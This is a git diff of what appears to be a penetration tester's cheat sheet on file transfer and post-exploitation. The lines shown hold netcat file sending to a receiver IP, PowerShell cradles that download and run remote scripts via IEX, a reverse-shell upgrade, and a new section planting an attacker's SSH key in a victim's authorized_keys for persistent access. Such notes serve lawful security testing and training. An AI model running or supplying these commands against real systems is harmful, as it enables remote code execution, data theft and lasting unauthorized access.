@@ -20,15 +20,19 @@ cat [file] | nc [receiver_IP] [receiver_port] - Alternative
 
 #### SCP
 
-`scp [-r] <file path> $user@$ip:/<where you want to store it>`&#x20;
+`scp [-r] <local_path> $user@$ip:/<remote_path> [Upload local to remote]`
+
+`scp [-r] $user@$ip:/<remote_path> <local_path> [Download remote to local]`&#x20;
 
 #### Powershell
 
+{% code fullWidth="true" %}
 ```
-powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.31.141/ignite.txt', 'ignite.txt')
+powershell (New-Object System.Net.WebClient).DownloadFile('http://IP/file', 'file')
 download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE')
 Invoke-WebRequest http://domain.tld/script.ps1 -OutFile C:\Windows\Tasks\script.ps1
 ```
+{% endcode %}
 
 #### Certutil
 
@@ -48,7 +52,7 @@ net use \\ATTACKER_IP\share /del
 ## Upgrading Reverse Shell&#x20;
 
 ```
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 Ctrl-Z
 # In Kali
@@ -126,5 +130,18 @@ git show <hash> [in logs]
 git restore [file]
 git log
 git checkout [hash]
+```
 
+### SSH Keys
+
+Every revshell as an actual user -> this is the play
+
+```
+KALI
+ssh-keygen -t rsa
+chmod 700 ~/.ssh; chmod 600 ~/.ssh/id_rsa [kali]
+
+REMOTE
+/home/user/.ssh$ echo "[id_rsa.pub value]" > authorized_keys
+chmod 700 .ssh; chmod 700 .ssh/authorized_keys
 ```
